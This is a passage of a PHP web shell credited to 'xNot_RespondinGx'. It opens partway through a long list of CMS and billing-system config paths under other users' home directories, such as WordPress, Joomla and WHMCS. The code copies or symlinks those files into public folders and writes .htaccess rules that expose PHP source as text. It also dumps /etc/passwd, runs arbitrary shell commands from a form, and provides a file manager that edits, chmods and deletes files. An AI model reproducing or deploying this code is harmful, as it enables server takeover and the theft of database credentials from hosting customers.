"/home/$user_con7ext/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/inc/conf_global.php" => "IPB",
"/home/$user_con7ext/public_html/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/blog/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/submitticket.php" => "^WHMCS",
"/home/$user_con7ext/public_html/cms/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/beta/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/portal/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/site/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/main/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/home/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/demo/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/test/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/v1/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/v2/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/new/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("xNot_configgrab/$user_con7ext-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"xNot_Symconfig/".$user_con7ext."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"xNot_sym404/".$user_con7ext."-".$nama_config.".txt");
if($sym404){
	@mkdir("xNot_sym404/".$user_con7ext."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
HeaderName con7ext.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("xNot_sym404/".$user_con7ext."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"xNot_sym404/".$user_con7ext."-".$nama_config.".txt404/con7ext.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?path=$path/xNot_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"xNot_sym404/root/\">SymlinkNya</a>
<br><a href=\"xNot_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"xNot_Symconfig/root/\">Symlinknya</a>
<br><a href=\"xNot_Symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"con7ext_symvhost/root/\">Root Server</a>
<br><a href=\"con7ext_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}
}
if($_GET['symlink'] == '404') {
@error_reporting(0);
@ini_set('display_errors', 0); 
echo '<center><b><a href="https://www.facebook.com/sontik.sontik5">Coded By xNot_RespondinGx</a></b><br>
<form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
<br>
<br>Save As: <input name="jnck" value="xNot.txt"><input name="ojaykan" type="submit" value="Crooot Disini Sam"></form><br>';
if($_POST['ojaykan']){
rmdir("xNot_symlink404");mkdir("xNot_symlink404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." xNot_symlink404/".$jnck);
symlink($dir,"xNot_symlink404/".$jnck);
$inija = fopen("xNot_symlink404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck."
Options Indexes FollowSymLinks
DirectoryIndex ngeue.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
");
echo'<a href="xNot_symlink404/" target="_blank">Croot Sam >:(</a>';
}
}  elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
}
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Crotz" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Pilih</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Ganti Nama</option>
<option value="edit">Ubah</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>